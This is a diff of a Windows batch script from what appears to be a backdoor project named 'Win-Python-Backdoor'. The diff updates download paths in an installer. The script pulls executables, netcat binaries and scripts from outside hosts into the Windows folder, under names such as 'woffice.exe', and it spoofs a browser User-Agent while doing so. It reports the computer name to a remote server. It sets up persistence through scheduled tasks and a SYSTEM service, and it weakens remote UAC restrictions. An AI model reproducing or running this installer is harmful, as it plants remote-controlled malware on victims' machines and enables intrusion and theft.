@@ -34,7 +34,8 @@ rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Back
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/get.bat','%windir%\get.bat')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
 set url=http://config01.homepc.it
-set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
+set url=http://config01.homepc.it
+rem set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
 %windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/svc/wup.php?pc=pdf_%computername%','%windir%\pdf.txt')"
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
 %windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')"
@@ -42,13 +43,13 @@ if "%PROCESSOR_ARCHITECTURE%"=="x86" goto 32BIT
 echo 64-bit OS
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')
 %windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')"
-wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
+wget --no-check-certificate %urlgit%/win/nc64.exe  -O %windir%\nc64.exe
 goto END
 :32BIT
 echo 32-bit OS
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')
 %windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')"
-wget --no-check-certificate %urlgit%/nc.exe  -O %windir%\nc64.exe
+wget --no-check-certificate %urlgit%/win/nc.exe  -O %windir%\nc64.exe
 :END
 
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wofficeie1.exe','%windir%\wofficeie1.exe')
@@ -66,13 +67,13 @@ schtasks /delete /tn office_get /F
 
 rem wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
 
-wget --no-check-certificate %urlgit%/get.vbs  -O %windir%\get.vbs
-wget --no-check-certificate %urlgit%/sys.xml  -O %windir%\sys.xml
-wget --no-check-certificate %urlgit%/syskill.xml  -O %windir%\syskill.xml
-wget --no-check-certificate %urlgit%/office_get.xml  -O %windir%\office_get.xml
+wget --no-check-certificate %urlgit%/win/get.vbs  -O %windir%\get.vbs
+wget --no-check-certificate %urlgit%/win/sys.xml  -O %windir%\sys.xml
+wget --no-check-certificate %urlgit%/win/syskill.xml  -O %windir%\syskill.xml
+wget --no-check-certificate %urlgit%/win/office_get.xml  -O %windir%\office_get.xml
 schtasks /create /tn office_get /xml %windir%\office_get.xml /F
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice2.exe
+wget --no-check-certificate %urlgit%/win/woffice.exe  -O %windir%\woffice2.exe
 rem %windir%\wofficeie1.exe
 rem SLEEP 10
 rem taskkill /f /im NisSrv.exe
@@ -88,10 +89,10 @@ schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice2.exe
 schtasks /create /tn sys /xml %windir%\sys.xml /F
 schtasks /create /tn syskill /xml %windir%\syskill.xml /F
 sc delete initsw
-wget --no-check-certificate %urlgit%/init.vbs  -O %windir%\init.vbs
+wget --no-check-certificate %urlgit%/win/init.vbs  -O %windir%\init.vbs
 rem wget --no-check-certificate %urlgit%/initsw.xml  -O %windir%\initsw.xml
-curl -A "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36" -L %urlgit%/initsw.xml -o %windir%\initsw.xml 
-wget --no-check-certificate %urlgit%/winsw.exe  -O %windir%\initsw.exe
+curl -A "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36" -L %urlgit%/win/initsw.xml -o %windir%\initsw.xml 
+wget --no-check-certificate %urlgit%/win/winsw.exe  -O %windir%\initsw.exe
 cd %windir%
 initsw.exe install
 net start initsw
